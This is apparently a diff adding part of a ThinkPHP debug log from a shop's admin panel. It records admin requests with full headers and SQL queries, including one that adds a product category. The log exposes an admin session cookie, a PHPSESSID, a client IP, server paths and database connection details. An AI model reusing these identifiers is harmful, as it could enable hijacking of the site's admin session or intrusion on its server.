+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'newsclass',
+  'formname' => 'productc',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/page/newsclass.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000749s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001076s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006085s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000969s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001394s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.047731s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003628s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000497s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000859s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004376s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001232s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000424s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007004s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006758s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006799s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.006996s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.007353s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006899s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.007078s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006574s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006573s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006654s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006434s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006281s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.005637s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.005625s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.005765s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.005673s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.005685s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005807s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.005867s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005640s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005756s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.005692s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006055s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.005921s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006150s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006016s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005992s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006348s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006369s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006100s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006101s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006147s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006148s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006331s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006176s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005924s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005746s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005810s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005987s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005762s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005943s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005713s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005617s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005642s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005664s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005698s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005610s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005712s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006041s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001118s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000455s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.001301s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000469s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000763s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000268s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000681s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000270s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000240s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:42+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree
+[运行时间：0.105537s] [吞吐率：9.48req/s] [内存消耗：3,812.09kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '34',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '500',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000756s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001155s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001596s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:16:00+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/selclass?formnam=productc&selname=MOEDOR%20DE
+[运行时间：0.028801s] [吞吐率：34.72req/s] [内存消耗：2,711.84kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'selclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formnam' => 'productc',
+  'selname' => 'MOEDOR DE',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->selclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000817s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001230s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `name` LIKE '%MOEDOR DE%' [ RunTime:0.000887s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:16:02+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/addclass
+[运行时间：0.026821s] [吞吐率：37.28req/s] [内存消耗：2,683.02kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'addclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '89',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'name' => 'ELÉTRICO',
+  'laug' => '简体中文',
+  'topid' => '2141',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->addclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000743s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001092s ]
+[ sql ] [ SQL ] INSERT INTO `productc` (`name` , `laug` , `parent_id` , `create_time` , `sort`) VALUES ('ELÉTRICO' , '简体中文' , '2141' , '2024-06-13 00:16:02' , 0) [ RunTime:0.000386s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:16:04+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc
+[运行时间：0.487370s] [吞吐率：2.05req/s] [内存消耗：3,439.66kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'newsclass',
+  'formname' => 'productc',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/page/newsclass.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000812s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001128s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006049s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000939s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001456s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.048888s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003599s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000589s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000929s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.003857s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001670s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000451s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007140s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006946s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006755s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.006821s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.006829s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006618s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006379s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006586s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.007258s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006900s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006812s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.007521s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.006578s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.006604s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006857s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006540s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006634s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.006646s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006642s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.006273s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.006538s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006250s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006107s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006655s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006337s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006512s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006290s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006266s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.009154s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.010919s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.010663s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.010608s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.010525s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.007589s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006351s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006154s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006057s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005854s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005697s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005748s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005746s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005818s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005854s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005812s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005750s ]
